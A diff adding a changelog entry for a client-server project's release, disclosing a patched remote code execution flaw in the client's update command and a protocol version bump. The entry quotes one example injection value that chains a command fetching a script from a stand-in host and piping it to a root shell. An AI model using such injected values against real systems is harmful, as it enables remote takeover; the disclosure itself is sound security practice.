@@ -14,6 +14,13 @@
 # - Release description: detailed information about the release
 # - =--- END ---=: marks the end of the release 
 
+=--- v1.2.7-ilex ---=
+### What Changed
+- **Fixed potential RCE vuln on `bw-client`**: `bw-client` allowed arbitrary content executed in a regular shell via the `update` command. This allowed attacker to send custom-crafted commands such as `UPDATE args="idk && curl evil.dev | bash` that will be executed as root. This update patches this by not spawning a shell at all (and doing some stricter validation).
+- **Protocol bump**: The protocol version has been bumped to `2.1.4` since `Commands.UPDATE` now expects a `version` kwarg instead of an `args` one.
+
+=--- END ---=
+
 =--- v1.2.6-jagera ---=
 ### What Changed
 - **`botwave` shell command**: A new `botwave` command is now installed alongside the other binaries. Running it prints a quick getting-started guide based on what's installed on the machine (server and/or client), including example commands to get going. The installer now points you to it after a successful install.
